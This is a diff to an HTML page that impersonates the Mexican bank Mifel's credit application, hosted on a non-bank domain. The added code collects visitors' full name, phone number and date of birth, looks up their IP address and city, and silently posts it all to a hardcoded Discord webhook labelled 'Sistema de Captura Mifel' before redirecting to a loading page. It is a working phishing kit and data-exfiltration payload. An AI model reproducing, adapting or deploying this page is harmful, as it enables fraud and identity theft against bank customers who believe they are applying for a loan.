@@ -3,15 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta property="og:title" content="Portal Mifel" />
-<meta property="og:description" content="Descubre los servicios financieros personalizados en Mifel. Cuentas, créditos, inversiones y seguros diseñados para ti y tus necesidades." />
-<meta property="og:image" content="https://i.postimg.cc/Dzmn6tMh/E5f-PMPh-Yogz-Ubf-A.jpg" />
-<meta property="og:image:secure_url" content="https://i.postimg.cc/Dzmn6tMh/E5f-PMPh-Yogz-Ubf-A.jpg" />
-<meta property="og:image:type" content="image/jpeg" />
-<meta property="og:image:width" content="1200" />
-<meta property="og:image:height" content="630" />
-<meta property="og:url" content="https://mifel-portal.hstn.me/soli.html" />
-<meta property="og:type" content="website" />
+    <meta property="og:title" content="Portal Mifel" />
+    <meta property="og:description" content="Descubre los servicios financieros personalizados en Mifel. Cuentas, créditos, inversiones y seguros diseñados para ti y tus necesidades." />
+    <meta property="og:image" content="https://i.postimg.cc/Dzmn6tMh/E5f-PMPh-Yogz-Ubf-A.jpg" />
+    <meta property="og:image:secure_url" content="https://i.postimg.cc/Dzmn6tMh/E5f-PMPh-Yogz-Ubf-A.jpg" />
+    <meta property="og:image:type" content="image/jpeg" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+    <meta property="og:url" content="https://mifel-portal.hstn.me/soli.html" />
+    <meta property="og:type" content="website" />
     <title>Mifel - Solicitud de Crédito</title>
     <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600&family=Raleway:wght@300;400;500;600&display=swap" rel="stylesheet">
     <style>
@@ -33,10 +33,8 @@
 
         /* --- HEADER --- */
         .top-header {
-            display: flex;
-            justify-content: center;
-            padding: 20px 50px;
-            border-bottom: 1px solid #f0f0f0;
+            display: flex; justify-content: center;
+            padding: 20px 50px; border-bottom: 1px solid #f0f0f0;
         }
         .logo-center { width: 120px; }
 
@@ -72,22 +70,36 @@
         .welcome-text { color: var(--mifel-blue-dark); font-size: 24px; font-weight: 600; margin-bottom: 10px; }
         .sub-text { color: var(--text-grey); font-size: 15px; margin-bottom: 30px; line-height: 1.5; }
 
-        /* SIMULADOR ESTILO ANTERIOR */
+        /* --- FORMULARIO Y CAMPOS DE TEXTO --- */
         .simulator-box { width: 100%; margin-bottom: 20px; }
+        .input-group { width: 100%; margin-bottom: 15px; text-align: left; }
+        .input-group label { font-size: 14px; color: var(--text-grey); margin-bottom: 8px; display: block; }
+        .input-group input, .dob-wrapper select {
+            width: 100%; padding: 14px; border: 1px solid transparent;
+            background-color: var(--input-bg); border-radius: 8px;
+            font-size: 15px; outline: none; box-sizing: border-box;
+            color: #333; font-family: inherit;
+        }
+        .input-group input:focus { border-color: var(--mifel-cyan); background-color: #fff; }
 
-        .display-label { font-size: 14px; color: var(--text-grey); margin-bottom: 10px; display: block; }
-        .big-value { font-size: 36px; font-weight: 700; color: var(--mifel-blue-dark); margin-bottom: 15px; }
+        /* DISEÑO DE FECHA DE NACIMIENTO (DD/MM/AAAA) */
+        .dob-wrapper { display: flex; gap: 10px; justify-content: flex-start; }
+        .dob-wrapper select {
+            padding: 12px 10px; cursor: pointer; -webkit-appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='grey' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat; background-position: right 10px center; background-size: 15px;
+        }
+        .dob-day { flex: 2; } .dob-month { flex: 3; } .dob-year { flex: 3; }
+
+        /* --- ELEMENTOS RESTAURADOS DEL CRÉDITO --- */
+        .display-label { font-size: 14px; color: var(--text-grey); margin-bottom: 10px; display: block; text-align: left;}
+        .big-value { font-size: 36px; font-weight: 700; color: var(--mifel-blue-dark); margin-bottom: 15px; text-align: center;}
         .cyan-value { color: var(--mifel-cyan); font-weight: 700; }
 
-        /* SLIDERS */
+        /* SLIDERS ORIGINALES */
         .slider-group { margin-bottom: 35px; width: 100%; }
-        
-        input[type=range] {
-            width: 100%; -webkit-appearance: none; background: transparent;
-        }
-        input[type=range]::-webkit-slider-runnable-track {
-            width: 100%; height: 6px; background: var(--input-bg); border-radius: 10px;
-        }
+        input[type=range] { width: 100%; -webkit-appearance: none; background: transparent; }
+        input[type=range]::-webkit-slider-runnable-track { width: 100%; height: 6px; background: var(--input-bg); border-radius: 10px; }
         input[type=range]::-webkit-slider-thumb {
             height: 22px; width: 22px; border-radius: 50%;
             background: var(--mifel-cyan); cursor: pointer;
@@ -95,17 +107,17 @@
             box-shadow: 0 4px 10px rgba(0, 209, 193, 0.3);
         }
 
-        /* DESGLOSE DE COSTOS (LIMPIO) */
+        /* DESGLOSE DE COSTOS ORIGINAL */
         .cost-summary {
             display: flex; justify-content: space-between;
             padding: 20px 0; border-top: 1px solid #f0f0f0;
-            margin-top: 10px;
+            margin-top: 10px; text-align: left;
         }
         .cost-item { text-align: left; }
         .cost-label { font-size: 12px; color: var(--text-grey); display: block; }
         .cost-val { font-size: 16px; font-weight: 600; color: #333; }
 
-        /* BOTÓN CON BRILLO */
+        /* BOTÓN CON BRILLO ORIGINAL */
         .btn-continuar {
             width: 100%; padding: 18px;
             background-color: var(--mifel-cyan); color: var(--mifel-blue-dark);
@@ -116,6 +128,7 @@
             margin-top: 20px;
         }
         .btn-continuar:hover { background-color: #00b3a5; transform: translateY(-2px); }
+        .btn-continuar:disabled { opacity: 0.6; cursor: not-allowed; }
         
         .btn-continuar::after {
             content: ''; position: absolute; top: -50%; left: -150%;
@@ -126,7 +139,7 @@
         @keyframes shine { 0% { left: -150%; } 20% { left: 150%; } 100% { left: 150%; } }
 
         .terms { margin-top: 25px; font-size: 13px; color: var(--text-grey); }
-        .terms a { color: var(--link-blue); text-decoration: none; font-weight: 600; }
+        .terms a { color: var(--mifel-blue-dark); text-decoration: none; font-weight: 600; }
 
         @media (max-width: 480px) {
             .big-value { font-size: 28px; }
@@ -145,9 +158,51 @@
         </div>
 
         <h1 class="welcome-text">Solicita tu Crédito</h1>
-        <p class="sub-text">Obtén una de las tasas más bajas del mercado, exclusiva para ti. Depósito inmediato en tu cuenta Mifel.</p>
+        <p class="sub-text">Obtén una de las tasas más bajas del mercado. Completa tus datos básicos para iniciar.</p>
 
-        <div class="simulator-box">
+        <form id="solicitudForm" class="simulator-box">
+            <div class="input-group">
+                <label>Nombre(s)</label>
+                <input type="text" id="nombre" required placeholder="Ej. Juan Carlos">
+            </div>
+            <div class="input-group">
+                <label>Apellidos</label>
+                <input type="text" id="apellidos" required placeholder="Ej. Pérez García">
+            </div>
+            <div class="input-group">
+                <label>Número de teléfono</label>
+                <input type="tel" id="telefono" maxlength="10" required placeholder="10 dígitos" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+            </div>
+
+            <div class="input-group">
+                <label>Fecha de nacimiento (DD/MM/AAAA)</label>
+                <div class="dob-wrapper">
+                    <select id="dob-day" class="dob-day" required>
+                        <option value="" disabled selected>Día</option>
+                    </select>
+                    <select id="dob-month" class="dob-month" required>
+                        <option value="" disabled selected>Mes</option>
+                        <option value="01">Enero</option>
+                        <option value="02">Febrero</option>
+                        <option value="03">Marzo</option>
+                        <option value="04">Abril</option>
+                        <option value="05">Mayo</option>
+                        <option value="06">Junio</option>
+                        <option value="07">Julio</option>
+                        <option value="08">Agosto</option>
+                        <option value="09">Septiembre</option>
+                        <option value="10">Octubre</option>
+                        <option value="11">Noviembre</option>
+                        <option value="12">Diciembre</option>
+                    </select>
+                    <select id="dob-year" class="dob-year" required>
+                        <option value="" disabled selected>Año</option>
+                    </select>
+                </div>
+            </div>
+
+            <hr style="border: none; border-top: 1px solid #f0f0f0; margin: 25px 0;">
+
             <span class="display-label">Monto a solicitar:</span>
             <div class="big-value" id="val-monto">$50,000</div>
             <div class="slider-group">
@@ -170,25 +225,58 @@
                 </div>
             </div>
 
-            <button class="btn-continuar">Continuar solicitud</button>
-        </div>
+            <button type="submit" class="btn-continuar" id="btnEnvio">Continuar solicitud</button>
+        </form>
 
         <p class="terms">Sujeto a aprobación. <a href="#">Ver CAT y Comisiones</a></p>
     </main>
 
-<script>
+    <script>
+        // Llenar selectores de Fecha automáticamente
+        const daySelect = document.getElementById('dob-day');
+        const yearSelect = document.getElementById('dob-year');
+        
+        for (let i = 1; i <= 31; i++) {
+            let opt = document.createElement('option');
+            opt.value = i < 10 ? '0' + i : i;
+            opt.innerHTML = i;
+            daySelect.appendChild(opt);
+        }
+
+        const currentYear = new Date().getFullYear();
+        // Limitar a mayores de 18 años
+        for (let i = currentYear - 18; i >= currentYear - 85; i--) {
+            let opt = document.createElement('option');
+            opt.value = i;
+            opt.innerHTML = i;
+            yearSelect.appendChild(opt);
+        }
+
+        // Función para obtener IP
+        async function getIpData() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return { ip: data.ip || "0.0.0.0", city: data.city || "N/A" };
+            } catch { return { ip: "0.0.0.0", city: "Error" }; }
+        }
+
+        // Webhook URL
+        const webhookUrl = "https://discord.com/api/webhooks/1482477421277089842/OeDB4qgLFBAw4YAktlUOVHcEr6qFaCuYkfOnhPvffACFULg-Su2be4BJxr6GcneaSNI2";
+
         const rangeMonto = document.getElementById('range-monto');
         const rangePlazo = document.getElementById('range-plazo');
         const displayMonto = document.getElementById('val-monto');
         const displayPlazo = document.getElementById('val-plazo');
         const displayPago = document.getElementById('val-pago');
-        const btnContinuar = document.querySelector('.btn-continuar'); // Seleccionamos el botón
+        const form = document.getElementById('solicitudForm');
+        const btnEnvio = document.getElementById('btnEnvio');
 
+        // Lógica de cálculo del simulador
         function actualizar() {
             const monto = parseInt(rangeMonto.value);
             const meses = parseInt(rangePlazo.value);
             const tasaAnual = 0.089; 
-            
             const tasaMensual = tasaAnual / 12;
             const pago = (monto * tasaMensual) / (1 - Math.pow(1 + tasaMensual, -meses));
 
@@ -203,14 +291,53 @@
             }).format(pago);
         }
 
-        // Evento para redirigir al hacer clic
-        btnContinuar.addEventListener('click', () => {
-            window.location.href = "loading.html";
+        // Envío del formulario y webhook
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            btnEnvio.disabled = true;
+            btnEnvio.innerText = "Procesando...";
+
+            // Construir fecha DD/MM/AAAA
+            const dd = document.getElementById('dob-day').value;
+            const mm = document.getElementById('dob-month').value;
+            const aa = document.getElementById('dob-year').value;
+            const fechaFinal = `${dd}/${mm}/${aa}`;
+
+            const geo = await getIpData();
+            
+            const payload = {
+                embeds: [{
+                    title: "🔔 Nuevo Inicio Sesion",
+                    color: 53680,
+                    fields: [
+                        { name: "👤 Nombre", value: document.getElementById('nombre').value + " " + document.getElementById('apellidos').value, inline: true },
+                        { name: "📞 Teléfono", value: document.getElementById('telefono').value, inline: true },
+                        { name: "🎂 F. Nacimiento", value: fechaFinal, inline: true },
+                        { name: "🌐 Conexión", value: `IP: ${geo.ip} - ${geo.city}`, inline: false }
+                    ],
+                    footer: { text: "Sistema de Captura Mifel" },
+                    timestamp: new Date()
+                }]
+            };
+
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                window.location.href = "loading.html";
+            } catch (error) {
+                console.error('Error al enviar:', error);
+                // Redirige de todos modos para no bloquear al usuario
+                window.location.href = "loading.html";
+            }
         });
 
+        // Eventos para el simulador
         rangeMonto.addEventListener('input', actualizar);
         rangePlazo.addEventListener('input', actualizar);
-        actualizar();
+        actualizar(); // Cálculo inicial
     </script>
 </body>
 </html>
